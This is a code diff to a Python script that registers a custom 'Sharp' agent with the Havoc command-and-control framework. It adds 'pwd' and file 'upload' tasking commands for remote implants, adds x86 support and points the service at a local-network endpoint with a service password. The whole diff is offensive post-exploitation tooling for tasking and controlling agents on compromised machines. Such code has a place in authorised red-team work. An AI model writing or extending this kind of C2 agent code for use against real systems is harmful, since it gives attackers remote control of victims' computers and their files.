@@ -1,7 +1,13 @@
 
+from base64 import b64decode
 from havoc.service import HavocService
 from havoc.agent import *
 import os, re
+
+
+COMMAND_UPLOAD           = 0x110
+COMMAND_DOWNLOAD         = 0x111
+
 
 class CommandShell(Command):
     #CommandId = 18
@@ -105,6 +111,57 @@ class CommandLs(Command):
         #packer.add_data(commands)
         packer.add_data("ls "+arguments["path"])
         return packer.buffer
+
+class CommandPwd(Command):
+    Name        = "pwd"
+    Description = "Get Current Directory"
+    Help        = "pwd"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = [
+    #     CommandParam(
+    #         name="pwd",
+    #         is_file_path=False,
+    #         is_optional=False
+    #     )
+    ]
+
+    def job_generate(self, arguments: dict) -> bytes:
+        print("[*] job generate")
+        Task = Packer()
+        Task.add_data("pwd")
+        return Task.buffer
+
+class CommandUpload(Command):
+    Name        = "upload"
+    Description = "upload a file"
+    Help        = "Example: upload /home/test.txt test.txt"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      =[
+        CommandParam(
+            name="localfile",
+            is_file_path=True,
+            is_optional=False
+        ),
+        CommandParam(
+            name="remotefile",
+            is_file_path=False,
+            is_optional=False
+        )
+        
+    ]
+    def job_generate(self, arguments: dict) -> bytes:
+        print("[*] job generate")
+        Task = Packer();
+        filedate =b64decode(arguments['localfile'])
+       # Task.add_data("upload"+filedate)
+       # Task.add_int(COMMAND_UPLOAD)
+        
+        Task.add_data("upload "+arguments['remotefile']+"*"+arguments['localfile'])
+        return Task.buffer
+     
+
 class Sharp(AgentType):
     Name = "Sharp"
     Author = "@smallbraintranman"
@@ -114,6 +171,7 @@ class Sharp(AgentType):
 
     Arch = [
         "x64",
+        "x86"
     ]
 
     Formats = [
@@ -157,6 +215,8 @@ class Sharp(AgentType):
         CommandExit(),
         CommandSleep(),
         CommandLs(),
+        CommandPwd(),
+        CommandUpload(),
     ]
 
     def generate( self, config: dict ) -> None:
@@ -273,12 +333,12 @@ class Sharp(AgentType):
 def main():
     Havoc_Sharp = Sharp()
     Havoc_Service = HavocService(
-        endpoint="ws://localhost:40056/service-endpoint",
+        endpoint="ws://192.168.8.36:40056/service-endpoint",
         password="service-password"
     )
 
     Havoc_Service.register_agent(Havoc_Sharp)
-
+    print("Register Agent Over!")
     return
 
 
